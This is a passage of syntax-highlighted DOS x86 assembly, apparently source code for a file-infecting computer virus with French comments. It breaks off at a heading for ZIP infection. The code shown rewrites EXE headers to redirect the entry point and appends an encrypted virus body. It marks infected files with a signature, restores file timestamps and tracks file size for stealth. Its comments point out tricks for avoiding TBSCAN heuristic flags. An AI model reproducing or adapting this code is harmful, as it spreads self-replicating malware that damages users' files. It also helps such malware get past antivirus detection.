</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;recup time/date de la memoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_date</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">                             </span><span class="sc1">;int 57, fc 01=changement time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                 </span><span class="sc1">;evite le flag F de TBSCAN</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                </span><span class="sc1">;go!</span><span class="sc0">

</span><span class="sc5">pointeur_debut</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                                  </span><span class="sc1">;pointeur au</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                     </span><span class="sc1">;debut du</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                     </span><span class="sc1">;fichier sur le disque</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                        </span><span class="sc1">;go!</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pointeur_fin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                               </span><span class="sc1">;pointeur a  </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;la fin du</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                  </span><span class="sc1">;fichier sur le disque</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;go! retour: taille dans ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">create_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">erase_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                           </span><span class="sc1">;ouverture</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">nouvelle_int_24</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;c'est ici que se brancheront les appels</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">ip_24</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">cs_24</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">push_all</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_all_tmp</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_all_tmp</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pop_all</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_all_tmp</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_all_tmp</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">annuler_registres</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">process_exe1_from_resident</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">process_exe1</span><span class="sc0">

</span><span class="sc5">process_exe1_from_runtime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">process_exe1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------sauve valeurs du header-------------------------</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vIP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">   
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;---------pointeur fin du fichier disk (retourne dx:ax = taille)--------- </span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_fin</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">      </span><span class="sc1">;ajustement de la taille au paragraphe</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;sup pour que l'IP de départ soit 0</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;on sauve la taille</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;----------------calcule nouveau cs:ip---------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ajuste_exe</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;valeurs transformees</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;stockes dans la zone header</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                                   </span><span class="sc1">;evite flag K !!</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;en mmoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1F00h</span><span class="sc0">    </span><span class="sc1">;plus grand sans flag </span><span class="sc0">
</span><span class="sc1">;-----------------calcule nouvelle taille---------------------------</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;on en a besoin un peu plus loin pour</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;l'ajustement du pointeur disque</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0"> 
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    
</span><span class="sc1">;----------------ecrit signature----------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exehead</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc1">;-------------ecrit header et virus sur le disque------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">;pointeur à partir du début du fichier</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;en ajoutant la taille ajustée au paragraphe</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;supérieur, pour avoir IP de départ = 0</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;go! </span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">taille_fse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_fse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">marqueur_inf</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">process_exe2_from_resident</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">process_exe2</span><span class="sc0">

</span><span class="sc5">process_exe2_from_runtime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">process_exe2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;---ecriture du corps crypté dans le nouveau fichier---------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_handle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ajuste_exe</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size_for_stealth</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">                                    </span><span class="sc1">;des 28 premiers octets</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;stockes dans cette zone</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;*********** INFECTION DES ZIP ***********************</span><span class="sc0">
